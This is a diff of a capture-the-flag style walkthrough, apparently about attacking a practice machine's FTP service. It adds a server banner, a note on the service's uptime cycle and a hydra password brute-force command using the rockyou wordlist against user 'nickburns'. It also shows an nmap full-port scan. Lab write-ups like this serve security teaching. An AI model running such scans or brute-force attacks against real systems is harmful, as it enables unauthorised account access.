@@ -206,7 +206,7 @@ I just reset my account (“nickburns” in case you’re dumb and can’t remem
 
 FTP = Freshener: Trees of Pine
 ------------------------------
-Time to find that FTP instance!
+Trying too hard on these section titles. Time to find that FTP instance!
 
 `~# nmap -vv 192.168.xx.xx -p1-65535 --open`
 
@@ -231,7 +231,12 @@ telnet: Unable to connect to remote host: Connection refused
 Trying 192.168.xx.xx...
 Connected to 192.168.xx.xx.
 Escape character is '^]'.
+220 Callahan_FTP_Server 1.3.5
 ```
 ^ *YARP*
 
-Ok, this looks like it'll be a job for `hydra`. Time to get that set up.
+Ok, this looks like it'll be a job for `hydra`. Time to get that set up. As a reminder, the FTP server cycles twice per hour: up for 15 minutes, and down for 15.
+
+`~# hydra -l nickburns -P /usr/share/wordlists/rockyou.txt ftp://192.168.xx.xx:65534`
+
+
